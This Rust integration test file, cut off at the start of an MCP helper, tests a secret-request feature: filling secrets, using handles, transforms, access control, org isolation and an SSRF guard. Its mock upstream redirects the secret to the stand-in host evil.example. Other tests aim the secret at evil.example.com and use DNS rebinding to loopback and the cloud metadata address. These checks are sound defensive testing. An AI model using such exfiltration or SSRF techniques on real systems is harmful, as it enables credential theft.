//! Secret requests end to end (docs/architecture/specs/secret-requests.md), on the in-memory SurrealDB
//! 3.3.5 engine with a mock upstream (a plain HTTP server on loopback, reached through a test-only host
//! mapping; production refuses http and loopback): an agent asks with `secret_request`, the person fills
//! it through the REST route the pop-up uses, the agent uses the handle in `http_request`, transforms it,
//! uses the derived handle; decline, expiry, replace and delete; who may fill, decline and see; org
//! isolation; the SSRF guard (rebinding to loopback and to metadata); the MCP URL-mode elicitation.
//!
//! The canary test fills one value and runs it through everything, with an upstream that echoes it back
//! raw and encoded, in a body, a header and an error, then looks for it (and its encoded and derived
//! forms) in every response the agent or the browser got, every table of both databases, the captured
//! log at trace level and the test snapshots: the database holds it only as `enc:v1:`.

mod common;

use std::sync::{Arc, Mutex, OnceLock};

use axum::{
    body::Body,
    extract::{Query, State},
    http::{HeaderMap, Request, StatusCode},
    response::{IntoResponse, Response},
    routing::{any, get},
    Router,
};
use base64::Engine;
use common::TestApp;
use eunomia_backend::rid::RecordIdExt;
use eunomia_backend::store::{CONTROL_TABLES, TENANT_TABLES};
use http_body_util::BodyExt;
use serde_json::{json, Value};
use tower::ServiceExt;
use tracing_subscriber::fmt::MakeWriter;

/// The pasted value. `+`, `/` and `=` make its URL-encoded and base64 forms differ from it.
const CANARY: &str = "cnry+9d41/c7e2=pasted-NEVER-seen-by-agents";
const SECOND: &str = "second-value-5b8e0f13-replaced";
const MOCK_HOST: &str = "api.mock.test";

// ---- log capture (as tests/secrets.rs) --------------------------------------------------------

static LOG: Mutex<String> = Mutex::new(String::new());
#[derive(Clone)]
struct Sink;
struct SinkWriter;
impl std::io::Write for SinkWriter {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        LOG.lock().unwrap().push_str(&String::from_utf8_lossy(buf));
        Ok(buf.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}
impl<'a> MakeWriter<'a> for Sink {
    type Writer = SinkWriter;
    fn make_writer(&'a self) -> SinkWriter {
        SinkWriter
    }
}
fn capture_logs() {
    static ONCE: OnceLock<()> = OnceLock::new();
    ONCE.get_or_init(|| {
        let sub = tracing_subscriber::fmt().with_env_filter("warn,eunomia_backend=trace,tower_http=trace").with_writer(Sink).with_ansi(false).finish();
        let _ = tracing::subscriber::set_global_default(sub);
    });
}

// ---- the mock upstream ------------------------------------------------------------------------

/// One request the upstream saw: (path, authorization header, query, body).
type Seen = (String, String, String, String);

#[derive(Clone, Default)]
struct Upstream {
    seen: Arc<Mutex<Vec<Seen>>>,
}

fn b64(s: &str) -> String {
    base64::engine::general_purpose::STANDARD.encode(s)
}

fn pct(s: &str) -> String {
    s.bytes().map(|b| if b.is_ascii_alphanumeric() || b"-._~".contains(&b) { (b as char).to_string() } else { format!("%{b:02X}") }).collect()
}

/// Echoes what it got: the Authorization header raw, base64'd and URL-encoded, in the body and in headers.
async fn echo(State(u): State<Upstream>, headers: HeaderMap, Query(q): Query<Vec<(String, String)>>, req: Request<Body>) -> Response {
    let path = req.uri().path().to_string();
    let body = String::from_utf8_lossy(&req.into_body().collect().await.unwrap().to_bytes()).to_string();
    let auth = headers.get("authorization").and_then(|v| v.to_str().ok()).unwrap_or_default().to_string();
    let query = q.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("&");
    u.seen.lock().unwrap().push((path.clone(), auth.clone(), query.clone(), body.clone()));
    let all = format!("{auth} {query} {body}");
    let out = json!({"you_sent": {"authorization": auth, "query": query, "body": body}, "b64": b64(&all), "pct": pct(&all), "auth_b64": b64(&auth), "auth_pct": pct(&auth)});
    let status = if path == "/fail" { StatusCode::INTERNAL_SERVER_ERROR } else { StatusCode::OK };
    let mut res = (status, axum::Json(out)).into_response();
    if let Ok(v) = axum::http::HeaderValue::from_str(&auth) {
        res.headers_mut().insert("x-echo", v.clone());
        res.headers_mut().insert("set-cookie", v);
    }
    if path == "/redirect" {
        *res.status_mut() = StatusCode::FOUND;
        res.headers_mut().insert("location", axum::http::HeaderValue::from_str(&format!("https://evil.example/?k={}", pct(&auth))).unwrap());
    }
    res
}

async fn upstream() -> (u16, Upstream) {
    let u = Upstream::default();
    let app = Router::new().route("/{*path}", any(echo)).route("/", get(echo)).with_state(u.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let mut t = eunomia_backend::secrets::outbound::TEST_TARGETS.lock().unwrap();
    if !t.iter().any(|(h, _)| h == MOCK_HOST) {
        t.push((MOCK_HOST.into(), "127.0.0.1".parse().unwrap()));
    }
    (port, u)
}

// ---- the world --------------------------------------------------------------------------------

struct World {
    app: TestApp,
    up: Upstream,
    port: u16,
    personal: String,
    /// every response body an agent or the browser got in the test
    seen: Mutex<Vec<String>>,
}

async fn world() -> World {
    capture_logs();
    let (port, up) = upstream().await;
    let app = TestApp::new().await;
    let personal = eunomia_backend::vaults::service::personal_vault_id(&app.db().await, &app.user.id).await.unwrap().to_string();
    World { app, up, port, personal, seen: Mutex::new(Vec::new()) }
}

impl World {
    fn host(&self) -> String {
        format!("{MOCK_HOST}:{}", self.port)
    }
    fn url(&self, path: &str) -> String {
        format!("http://{MOCK_HOST}:{}{path}", self.port)
    }
    fn keep(&self, v: &Value) {
        self.seen.lock().unwrap().push(v.to_string());
    }
    /// A tool over REST with a PAT (the agent).
    async fn agent(&self, token: &str, tool: &str, args: Value) -> Value {
        let ((_, body), _) = common::http(&self.app.router, "POST", &format!("/api/tools/{tool}"), Some(args), Some(token), None).await;
        self.keep(&body);
        body
    }
    async fn browser(&self, method: &str, path: &str, body: Option<Value>) -> (StatusCode, Value) {
        let (status, out) = self.app.http_session(method, path, body).await;
        self.keep(&out);
        (status, out)
    }
    async fn request(&self, name: &str, extra: Value) -> Value {
        let mut args = json!({"name": name, "label": format!("{name} label"), "description": "to call the mock API", "target": {"hosts": [self.host()], "placements": ["header", "query", "body"]}});
        if let (Some(a), Some(e)) = (args.as_object_mut(), extra.as_object()) {
            for (k, v) in e {
                a.insert(k.clone(), v.clone());
            }
        }
        let out = self.agent(&self.app.token, "secret_request", args).await;
        if out["status"] != "pending" {
            let log = LOG.lock().unwrap().clone();
            let tail: Vec<&str> = log.lines().filter(|l| l.contains("ERROR") || l.contains("WARN") || l.contains("error")).collect();
            panic!("{out}\n{}", tail.iter().rev().take(15).cloned().collect::<Vec<_>>().join("\n"));
        }
        out
    }
    async fn fill(&self, request: &Value, value: &str) -> Value {
        let id = request["request_id"].as_str().unwrap();
        let (status, out) = self.browser("POST", &format!("/api/secrets/requests/{id}/fill"), Some(json!({"value": value}))).await;
        assert_eq!(status, 200, "{out}");
        assert_eq!(out["status"], "filled");
        out
    }
    async fn http_get(&self, path: &str, handle: &str) -> Value {
        self.agent(&self.app.token, "http_request", json!({"url": self.url(path), "headers": {"Authorization": {"$secret": handle}}})).await
    }
    async fn raw(&self, db: &str, q: &str) -> Vec<Value> {
        if db == "control" {
            return self.app.control().test_raw().query(q).await.unwrap().take::<Vec<Value>>(0).unwrap();
        }
        self.app.db().await.test_raw().query(q).await.unwrap().take::<Vec<Value>>(0).unwrap()
    }
    fn last_auth(&self) -> String {
        self.up.seen.lock().unwrap().last().map(|s| s.1.clone()).unwrap_or_default()
    }
}

fn handle(v: &Value) -> String {
    v["handle"]["$secret"].as_str().or_else(|| v["handle"].as_str()).unwrap_or_else(|| panic!("no handle in {v}")).to_string()
}

fn hmac_hex(key: &str, msg: &str) -> String {
    use hmac::Mac;
    let mut m = <hmac::Hmac<sha2::Sha256> as Mac>::new_from_slice(key.as_bytes()).unwrap();
    m.update(msg.as_bytes());
    hex::encode(m.finalize().into_bytes())
}

// ---- the flow and the canary --------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn request_fill_use_transform_and_the_canary_is_nowhere() {
    let w = world().await;
    let req = w.request("mock_key", json!({})).await;
    let vault_key = w.personal.trim_start_matches("vault:").to_string();
    assert_eq!(handle(&req), format!("eu://{vault_key}/mock_key"));
    assert!(req["fill_url"].as_str().unwrap().ends_with(&format!("/secrets/requests/{}", req["request_id"].as_str().unwrap().trim_start_matches("secret_request:"))), "{req}");
    assert!(req["next"].as_str().unwrap().contains("never in this chat"));
    // a retry gets the same request
    let again = w.request("mock_key", json!({})).await;
    assert_eq!(again["request_id"], req["request_id"]);

    // the pop-up's list: the person who asked may fill it
    let (status, pending) = w.browser("GET", "/api/secrets/requests?status=pending", None).await;
    assert_eq!(status, 200, "{pending}");
    let row = pending.as_array().unwrap().iter().find(|r| r["id"] == req["request_id"]).expect("listed");
    assert_eq!((row["can_fill"].as_bool(), row["can_decline"].as_bool(), row["channel"].as_str()), (Some(true), Some(true), Some("rest")));
    assert_eq!(row["client_name"], "test", "the token's name is shown");
    assert_eq!(row["target_hosts"], json!([w.host()]));

    // an agent's credential can never fill its own request
    let id = req["request_id"].as_str().unwrap();
    let (status, body) = w.app.http("POST", &format!("/api/secrets/requests/{id}/fill"), Some(json!({"value": CANARY})), true).await;
    assert_eq!(status, 403, "{body}");

    let filled = w.fill(&req, CANARY).await;
    assert_eq!(filled["handle"], handle(&req));
    let (status, body) = w.browser("POST", &format!("/api/secrets/requests/{id}/fill"), Some(json!({"value": CANARY}))).await;
    assert_eq!((status.as_u16(), body["code"].as_str()), (409, Some("secret.request_closed")), "a request is filled once");

    let st = w.agent(&w.app.token, "secret_request_status", json!({"request_id": id})).await;
    assert_eq!((st["status"].as_str(), handle(&st)), (Some("filled"), handle(&req)));
    let again = w.agent(&w.app.token, "secret_request", json!({"name": "mock_key", "description": "x"})).await;
    assert_eq!(again["status"], "filled", "a usable secret by that name is handed back, no new pop-up: {again}");

    // use: header and query, to an upstream that echoes it back raw, base64'd and URL-encoded
    let h = handle(&req);
    let out = w.agent(&w.app.token, "http_request", json!({"url": w.url("/echo"), "headers": {"Authorization": {"$secret": h}}, "query": {"k": {"$secret": h}}})).await;
    assert_eq!(out["status"], 200, "{out}");
    assert_eq!(w.last_auth(), CANARY, "the upstream got the value");
    assert_eq!(w.up.seen.lock().unwrap().last().unwrap().2, format!("k={CANARY}"));
    let body = out["body"].as_str().unwrap();
    assert!(body.contains("[redacted: secret]"), "{body}");
    assert!(out.get("headers").is_none(), "response headers (x-echo, set-cookie) are dropped");
    // a JSON body with a handle inside
    let out = w.agent(&w.app.token, "http_request", json!({"method": "POST", "url": w.url("/echo"), "json": {"auth": {"token": {"$secret": h}}}})).await;
    assert_eq!(out["status"], 200, "{out}");
    assert!(w.up.seen.lock().unwrap().last().unwrap().3.contains(CANARY));
    // an error page that echoes it, and a redirect whose Location carries it
    let out = w.http_get("/fail", &h).await;
    assert_eq!((out["status"].as_u64(), out["ok"].as_bool()), (Some(500), Some(false)), "{out}");
    let out = w.http_get("/redirect", &h).await;
    assert_eq!((out["status"].as_u64(), out["redirect"].as_bool()), (Some(302), Some(true)), "{out}");
    assert_eq!(w.up.seen.lock().unwrap().iter().filter(|s| s.0 == "/redirect").count(), 1, "the redirect was not followed");

    // every transform, and each derived handle used
    let t = |op: &str, inputs: Value, params: Value, name: &str| {
        let w = &w;
        let (op, name) = (op.to_string(), name.to_string());
        async move {
            let out = w.agent(&w.app.token, "secret_transform", json!({"op": op, "inputs": inputs, "params": params, "name": name})).await;
            assert!(out.get("error").is_none(), "{op}: {out}");
            assert_eq!(out["allowed_hosts"], json!([w.host()]), "{op} inherits the approved host");
            handle(&out)
        }
    };
    let bearer = t("template", json!({"key": h}), json!({"template": "Bearer {{key}}"}), "mock_bearer").await;
    let b64h = t("base64", json!({"value": h}), json!({}), "mock_b64").await;
    let b64u = t("base64url", json!({"value": h}), json!({}), "mock_b64url").await;
    let urlh = t("url_encode", json!({"value": h}), json!({}), "mock_url").await;
    let basic = t("basic_auth", json!({"password": h}), json!({"user": "svc"}), "mock_basic").await;
    let mac = t("hmac_sha256", json!({"key": h}), json!({"message": "payload-1"}), "mock_hmac").await;
    let sha = t("sha256", json!({"value": h}), json!({"encoding": "base64"}), "mock_sha").await;
    let jwt = t("jwt_hs256", json!({"key": h}), json!({"claims": {"sub": "svc"}, "expires_in_seconds": 300}), "mock_jwt").await;
    // a transform of a derived handle (lineage two deep)
    let bearer_b64 = t("base64", json!({"value": bearer}), json!({}), "mock_bearer_b64").await;

    let out = w.http_get("/echo", &bearer).await;
    assert_eq!(out["status"], 200, "{out}");
    assert_eq!(w.last_auth(), format!("Bearer {CANARY}"));
    w.http_get("/echo", &basic).await;
    assert_eq!(w.last_auth(), format!("Basic {}", b64(&format!("svc:{CANARY}"))));
    w.http_get("/echo", &mac).await;
    assert_eq!(w.last_auth(), hmac_hex(CANARY, "payload-1"));
    for hd in [&b64h, &b64u, &urlh, &sha, &jwt, &bearer_b64] {
        let out = w.http_get("/fail", hd).await;
        assert_eq!(out["status"], 500, "{hd}: {out}");
    }
    let jwt_sent = w.last_auth();
    // the bearer form went out base64'd as a whole: the upstream echoes that too
    assert_eq!(jwt_sent, b64(&format!("Bearer {CANARY}")));

    // over MCP as well
    let rpc = json!({"jsonrpc": "2.0", "id": 9, "method": "tools/call", "params": {"name": "http_request", "arguments": {"url": w.url("/echo"), "headers": {"Authorization": {"$secret": h}}}}});
    let ((status, mcp), _) = common::http(&w.app.router, "POST", "/mcp", Some(rpc), Some(&w.app.token), None).await;
    assert_eq!(status, 200);
    w.keep(&mcp);
    assert_eq!(mcp["result"]["isError"], false, "{mcp}");

    // the browser's list of held secrets: metadata only
    let (_, held) = w.browser("GET", "/api/secrets/held", None).await;
    assert!(held.as_array().unwrap().len() >= 10, "{held}");
    let derived = held.as_array().unwrap().iter().find(|s| s["name"] == "mock_bearer_b64").unwrap();
    assert_eq!(derived["op"], "base64");
    assert_eq!(derived["derived_from"].as_array().unwrap().len(), 1);
    let (_, activity) = w.browser("GET", "/api/secrets/activity?limit=200", None).await;
    let actions: Vec<&str> = activity["entries"].as_array().unwrap().iter().filter_map(|e| e["action"].as_str()).collect();
    for want in ["secret.request", "secret.fill", "secret.resolve", "secret.transform", "secret.http"] {
        assert!(actions.contains(&want), "{want} missing from {actions:?}");
    }
    let tr = activity["entries"].as_array().unwrap().iter().find(|e| e["action"] == "secret.transform" && e["reference"].as_str().unwrap().ends_with("mock_bearer_b64")).unwrap();
    assert_eq!(tr["lineage"].as_array().unwrap().len(), 2, "the whole lineage: {tr}");

    // ---- the canary, and every form an agent could have got it in
    let forms: Vec<String> = [
        CANARY.to_string(),
        b64(CANARY),
        base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(CANARY),
        pct(CANARY),
        hmac_hex(CANARY, "payload-1"),
        format!("Bearer {CANARY}"),
        b64(&format!("svc:{CANARY}")),
        b64(&format!("Bearer {CANARY}")),
        hex::encode(CANARY),
    ]
    .into_iter()
    // and the alignment-independent base64 cores, which any base64 of a text holding the value contains
    .chain([CANARY.to_string(), format!("Bearer {CANARY}")].into_iter().flat_map(|v| {
        (0..3).map(move |k| {
            let rest = &v.as_bytes()[k..];
            base64::engine::general_purpose::STANDARD_NO_PAD.encode(&rest[..rest.len() / 3 * 3])
        })
    }))
    .collect::<Vec<String>>();
    let responses = w.seen.lock().unwrap().join("\n");
    for f in &forms {
        assert!(!responses.contains(f.as_str()), "a response carried {f}");
    }
    for table in TENANT_TABLES {
        let rows = serde_json::to_string(&w.raw("org", &format!("SELECT * FROM {table}")).await).unwrap();
        for f in &forms {
            assert!(!rows.contains(f.as_str()), "{table} holds {f}");
        }
    }
    for table in CONTROL_TABLES {
        let rows = serde_json::to_string(&w.raw("control", &format!("SELECT * FROM {table}")).await).unwrap();
        for f in &forms {
            assert!(!rows.contains(f.as_str()), "control {table} holds {f}");
        }
    }
    let log = LOG.lock().unwrap().clone();
    assert!(log.contains("http_request"), "the log capture works");
    for f in &forms {
        assert!(!log.contains(f.as_str()), "the log holds {f}");
    }
    let snaps = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/snapshots");
    for e in std::fs::read_dir(snaps).unwrap() {
        let text = std::fs::read_to_string(e.unwrap().path()).unwrap_or_default();
        assert!(!text.contains(CANARY), "a snapshot holds the canary");
    }
    // at rest: only ciphertext, and the pasted row decrypts to the canary
    let stored = w.raw("org", "SELECT name, value_enc FROM vault_secret").await;
    assert!(stored.iter().all(|r| r["value_enc"].as_str().unwrap().starts_with("enc:v1:")), "{stored:?}");
    let pasted = stored.iter().find(|r| r["name"] == "mock_key").unwrap()["value_enc"].as_str().unwrap().to_string();
    assert_eq!(eunomia_backend::connectors::crypto::decrypt(&w.app.state.settings.encryption_key, &pasted).unwrap(), CANARY);
    let plain = w.app.db().await.test_raw().query("CREATE vault_secret SET vault = vault:x, name = 'p', value_enc = 'plain', created_by = user:x").await.unwrap().check();
    assert!(plain.is_err(), "the schema refuses a plaintext value");
}

// ---- decline, expiry, replace, delete -----------------------------------------------------------

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn decline_expiry_replace_and_delete() {
    let w = world().await;
    // decline
    let a = w.request("declined_key", json!({})).await;
    let id = a["request_id"].as_str().unwrap();
    let (status, out) = w.browser("POST", &format!("/api/secrets/requests/{id}/decline"), None).await;
    assert_eq!((status.as_u16(), out["status"].as_str()), (200, Some("declined")), "{out}");
    let (status, _) = w.browser("POST", &format!("/api/secrets/requests/{id}/fill"), Some(json!({"value": CANARY}))).await;
    assert_eq!(status, 409);
    assert_eq!(w.agent(&w.app.token, "secret_request_status", json!({"request_id": id})).await["status"], "declined");

    // expiry: a request past its time cannot be filled and reads as expired
    let b = w.request("expired_key", json!({"expires_in_minutes": 1})).await;
    let bid = b["request_id"].as_str().unwrap();
    w.app.db().await.test_raw().query(format!("UPDATE {bid} SET expires_at = time::now() - 1m")).await.unwrap().check().unwrap();
    assert_eq!(w.agent(&w.app.token, "secret_request_status", json!({"request_id": bid})).await["status"], "expired");
    let (status, body) = w.browser("POST", &format!("/api/secrets/requests/{bid}/fill"), Some(json!({"value": CANARY}))).await;
    assert_eq!((status.as_u16(), body["code"].as_str()), (409, Some("secret.request_closed")), "{body}");
    let (_, listed) = w.browser("GET", "/api/secrets/requests?status=expired", None).await;
    assert!(listed.as_array().unwrap().iter().any(|r| r["id"] == bid), "marked expired on read: {listed}");

    // a value too short to scrub is refused, and the message does not echo it
    let c = w.request("replaced_key", json!({})).await;
    let cid = c["request_id"].as_str().unwrap();
    let (status, body) = w.browser("POST", &format!("/api/secrets/requests/{cid}/fill"), Some(json!({"value": "short"}))).await;
    assert_eq!(status, 400, "{body}");
    assert!(!body.to_string().contains("\"short\""), "{body}");

    // replace: the derived secret goes, the new value is used
    w.fill(&c, CANARY).await;
    let h = handle(&c);
    let derived = w.agent(&w.app.token, "secret_transform", json!({"op": "template", "inputs": {"k": h}, "params": {"template": "Bearer {{k}}"}})).await;
    let dh = handle(&derived);
    assert!(dh.contains("/template_replaced_key_"), "the default name: {dh}");
    let held = w.raw("org", "SELECT VALUE <string> id FROM vault_secret WHERE name = 'replaced_key'").await;
    let hid = held[0].as_str().unwrap();
    let (status, out) = w.browser("PUT", &format!("/api/secrets/held/{hid}"), Some(json!({"value": SECOND}))).await;
    assert_eq!((status.as_u16(), out["removed_derived"].as_u64()), (200, Some(1)), "{out}");
    let gone = w.http_get("/echo", &dh).await;
    assert_eq!(gone["code"], "secret.unavailable", "{gone}");
    w.http_get("/echo", &h).await;
    assert_eq!(w.last_auth(), SECOND);

    // a transform never overwrites a pasted secret, and replaces a derived one only when asked
    let clash = w.agent(&w.app.token, "secret_transform", json!({"op": "base64", "inputs": {"value": h}, "name": "replaced_key", "replace": true})).await;
    assert_eq!(clash["code"], "db.duplicate", "{clash}");
    let d1 = w.agent(&w.app.token, "secret_transform", json!({"op": "base64", "inputs": {"value": h}, "name": "b64_once"})).await;
    assert!(d1.get("error").is_none(), "{d1}");
    let d2 = w.agent(&w.app.token, "secret_transform", json!({"op": "base64", "inputs": {"value": h}, "name": "b64_once"})).await;
    assert_eq!(d2["code"], "db.duplicate", "{d2}");
    let d3 = w.agent(&w.app.token, "secret_transform", json!({"op": "base64url", "inputs": {"value": h}, "name": "b64_once", "replace": true})).await;
    assert!(d3.get("error").is_none(), "{d3}");

    // an expired held secret does not resolve
    w.app.db().await.test_raw().query("UPDATE vault_secret SET expires_at = time::now() - 1m WHERE name = 'replaced_key'").await.unwrap().check().unwrap();
    let out = w.http_get("/echo", &h).await;
    assert_eq!(out["code"], "secret.unavailable", "{out}");
    assert!(out["error"].as_str().unwrap().contains("expired"), "{out}");

    // delete: the secret and what was derived from it
    let (status, out) = w.browser("DELETE", &format!("/api/secrets/held/{hid}"), None).await;
    assert_eq!(status, 200, "{out}");
    assert!(w.raw("org", "SELECT * FROM vault_secret").await.is_empty(), "b64_once went with its parent");
    let (status, _) = w.browser("DELETE", &format!("/api/secrets/held/{hid}"), None).await;
    assert_eq!(status, 404);
    for action in ["secret.decline", "secret.replace", "secret.delete"] {
        let n = w.raw("control", &format!("SELECT count() FROM audit_event WHERE action = '{action}' GROUP ALL")).await;
        assert_eq!(n[0]["count"], 1, "{action}");
    }
}

// ---- who may, isolation, the guard -------------------------------------------------------------

async fn pat(w: &World, user: &eunomia_backend::models_user::User, name: &str, vault: Option<&str>) -> (String, String) {
    let scopes: Vec<String> = eunomia_backend::scopes::ALL.iter().map(|s| s.to_string()).collect();
    let v = vault.map(|v| eunomia_backend::rid::parse(v).unwrap());
    let t = eunomia_backend::models_user::create_api_token_with(&w.app.state.control, &user.id, name, &scopes, v.as_ref(), None).await.unwrap();
    (t.token, t.id.to_string())
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn who_may_fill_decline_and_see_and_org_b_sees_nothing() {
    let w = world().await;
    // a shared vault the tester owns, with a member
    let team = w.app.tool("vault_create", json!({"name": "Team"})).await["id"].as_str().unwrap().to_string();
    let member = common::register(&w.app.state, "member@example.com").await;
    assert_eq!(member.org, w.app.user.org);
    w.app.tool("vault_invite", json!({"vault_id": team, "email": "member@example.com"})).await;
    let org = w.app.db().await;
    common::sys(eunomia_backend::vaults::service::accept_invitation(&org, &member.id, &eunomia_backend::rid::parse(&team).unwrap())).await.unwrap();
    let (m_token, _) = pat(&w, &member, "member-agent", None).await;
    let member_cookie = {
        let body = json!({"email": "member@example.com", "password": common::PASSWORD});
        let (_, c) = common::http(&w.app.router, "POST", "/api/auth/login", Some(body), None, None).await;
        c.map(|c| c.split(';').next().unwrap().to_string())
    };

    // the member's agent asks into Team: the tester (vault owner) sees it, may decline, may not fill
    let req = w.agent(&m_token, "secret_request", json!({"name": "team_key", "description": "d", "vault_id": "Team", "target": {"hosts": [w.host()]}})).await;
    assert_eq!(req["status"], "pending", "{req}");
    let id = req["request_id"].as_str().unwrap().to_string();
    let (_, mine) = w.browser("GET", &format!("/api/secrets/requests/{id}"), None).await;
    assert_eq!((mine["can_fill"].as_bool(), mine["can_decline"].as_bool()), (Some(false), Some(true)), "{mine}");
    let (status, body) = w.browser("POST", &format!("/api/secrets/requests/{id}/fill"), Some(json!({"value": CANARY}))).await;
    assert_eq!(status, 403, "only the asker fills: {body}");
    // the member fills their own (when their browser session is available in this harness)
    if let Some(cookie) = &member_cookie {
        let ((status, body), _) = common::http(&w.app.router, "POST", &format!("/api/secrets/requests/{id}/fill"), Some(json!({"value": CANARY})), None, Some(cookie)).await;
        assert_eq!(status, 200, "{body}");
    } else {
        let (status, _) = w.browser("POST", &format!("/api/secrets/requests/{id}/decline"), None).await;
        assert_eq!(status, 200);
    }

    // the tester's request into their personal vault is invisible to the member
    let personal = w.request("tester_only", json!({})).await;
    let pid = personal["request_id"].as_str().unwrap();
    let ((status, _), _) = common::http(&w.app.router, "GET", &format!("/api/secrets/requests/{pid}"), None, Some(&m_token), None).await;
    assert_eq!(status, 404);
    let status_by_member = w.agent(&m_token, "secret_request_status", json!({"request_id": pid})).await;
    assert_eq!(status_by_member["code"], "resource.not_found", "{status_by_member}");

    // a token restricted to Team asks only into Team
    let (restricted, _) = pat(&w, &w.app.user, "restricted", Some(&team)).await;
    let refused = w.agent(&restricted, "secret_request", json!({"name": "elsewhere", "description": "d", "vault_id": w.personal})).await;
    assert_eq!(refused["code"], "auth.scope", "{refused}");
    let defaulted = w.agent(&restricted, "secret_request", json!({"name": "in_team", "description": "d"})).await;
    assert_eq!(defaulted["vault_id"], team, "{defaulted}");
    // and cannot reach the REST routes at all (account level)
    let ((status, _), _) = common::http(&w.app.router, "GET", "/api/secrets/requests", None, Some(&restricted), None).await;
    assert_eq!(status, 403);

    // org B: sees nothing, cannot fill or use org A's
    w.fill(&personal, CANARY).await;
    let b = common::register_personal(&w.app.state, "orgb@example.com").await;
    assert_ne!(b.org, w.app.user.org);
    let (b_token, _) = pat(&w, &b, "b", None).await;
    let ((status, list), _) = common::http(&w.app.router, "GET", "/api/secrets/requests", None, Some(&b_token), None).await;
    assert_eq!((status.as_u16(), list), (200, json!([])));
    let ((_, held), _) = common::http(&w.app.router, "GET", "/api/secrets/held", None, Some(&b_token), None).await;
    assert_eq!(held, json!([]));
    let out = w.agent(&b_token, "http_request", json!({"url": w.url("/echo"), "headers": {"Authorization": {"$secret": handle(&personal)}}})).await;
    assert_eq!(out["code"], "secret.unavailable", "{out}");
    let out = w.agent(&b_token, "secret_transform", json!({"op": "base64", "inputs": {"value": handle(&personal)}})).await;
    assert_eq!(out["code"], "secret.unavailable", "{out}");

    // by default only the credential that asked may use it: another token of the same person may not
    let (other, _) = pat(&w, &w.app.user, "other-agent", None).await;
    let out = w.agent(&other, "http_request", json!({"url": w.url("/echo"), "headers": {"Authorization": {"$secret": handle(&personal)}}})).await;
    assert_eq!(out["code"], "secret.unavailable", "{out}");
    assert!(out["error"].as_str().unwrap().contains("not allowed for this credential"), "{out}");
    // "any agent of mine" lets it
    let any = w.request("any_agent_key", json!({})).await;
    let aid = any["request_id"].as_str().unwrap();
    let (status, _) = w.browser("POST", &format!("/api/secrets/requests/{aid}/fill"), Some(json!({"value": CANARY, "any_agent": true}))).await;
    assert_eq!(status, 200);
    let out = w.agent(&other, "http_request", json!({"url": w.url("/echo"), "headers": {"Authorization": {"$secret": handle(&any)}}})).await;
    assert_eq!(out["status"], 200, "{out}");

    // the activity log is for org owners and admins
    if let Some(cookie) = &member_cookie {
        let ((status, _), _) = common::http(&w.app.router, "GET", "/api/secrets/activity", None, None, Some(cookie)).await;
        assert_eq!(status, 403);
    }
    let pending_cap: Vec<Value> = futures::future::join_all((0..12).map(|i| w.agent(&w.app.token, "secret_request", json!({"name": format!("cap_{i}"), "description": "d"})))).await;
    assert!(pending_cap.iter().any(|r| r["code"] == "rate.limited"), "at most 10 pending per person");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn http_request_goes_only_where_the_person_approved_and_never_inside() {
    let w = world().await;
    let req = w.request("guarded", json!({"target": {"hosts": [w.host(), "rebind.mock.test", "meta.mock.test"], "placements": ["header"]}})).await;
    w.fill(&req, CANARY).await;
    let h = handle(&req);
    let call = |args: Value| w.agent(&w.app.token, "http_request", args);

    let out = call(json!({"url": format!("http://other.mock.test:{}/echo", w.port), "headers": {"A": {"$secret": h}}})).await;
    assert_eq!(out["code"], "secret.outbound_blocked", "an unmapped http host is refused: {out}");
    let out = call(json!({"url": "https://evil.example.com/", "headers": {"A": {"$secret": h}}})).await;
    assert_eq!(out["code"], "secret.host_denied", "{out}");
    let out = call(json!({"url": w.url("/echo"), "query": {"k": {"$secret": h}}})).await;
    assert_eq!(out["code"], "secret.host_denied", "query was not approved: {out}");
    let out = call(json!({"url": w.url("/echo")})).await;
    assert_eq!(out["code"], "secret.host_denied", "no handle, no call: {out}");
    let out = call(json!({"url": "https://127.0.0.1/", "headers": {"A": {"$secret": h}}})).await;
    assert_eq!(out["code"], "secret.outbound_blocked", "{out}");
    let out = call(json!({"url": w.url("/echo"), "headers": {"Host": "x", "A": {"$secret": h}}})).await;
    assert_eq!(out["code"], "validation.invalid", "{out}");

    // DNS rebinding: approved names that resolve to loopback or the metadata address fail at connect time
    eunomia_backend::secrets::outbound::TEST_DNS.lock().unwrap().push(("rebind.mock.test".into(), vec!["127.0.0.1".parse().unwrap()]));
    eunomia_backend::secrets::outbound::TEST_DNS.lock().unwrap().push(("meta.mock.test".into(), vec!["93.184.216.34".parse().unwrap(), "169.254.169.254".parse().unwrap()]));
    for host in ["rebind.mock.test", "meta.mock.test"] {
        let out = call(json!({"url": format!("https://{host}/latest/meta-data"), "headers": {"A": {"$secret": h}}})).await;
        assert_eq!(out["code"], "secret.outbound_blocked", "{host}: {out}");
        assert!(!out.to_string().contains(CANARY));
    }
    let blocked = w.raw("control", "SELECT count() FROM audit_event WHERE action = 'secret.http' AND outcome = 'blocked' GROUP ALL").await;
    assert_eq!(blocked[0]["count"], 2);

    // a handle anywhere else in the arguments is refused, the url included
    let out = call(json!({"url": {"$secret": h}})).await;
    assert!(out.get("error").is_some(), "{out}");
    assert!(!out.to_string().contains(CANARY), "{out}");
    // a tool that does not take secrets never resolves one
    let out = call(json!({"url": w.url("/echo"), "headers": {"A": {"$secret": h}}})).await;
    assert_eq!(out["status"], 200, "{out}");
    let out = w.agent(&w.app.token, "memory_write", json!({"subject_name": "X", "subject_kind": "organisation", "text": {"$secret": h}})).await;
    assert_eq!(out["code"], "secret.unavailable", "{out}");
    // eu:// is not a password-manager reference
    let (status, body) = w.browser("POST", "/api/secrets/refs", Some(json!({"reference": h, "provider": "onepassword_connect", "vault_id": w.personal, "allowed_tools": ["*"]}))).await;
    assert_eq!(status, 400, "{body}");
}

// ---- MCP ------------------------------------------------------------------------------------------

async fn mcp(w: &World, session: Option<&str>, body: Value) -> (StatusCode, Option<String>, Value) {
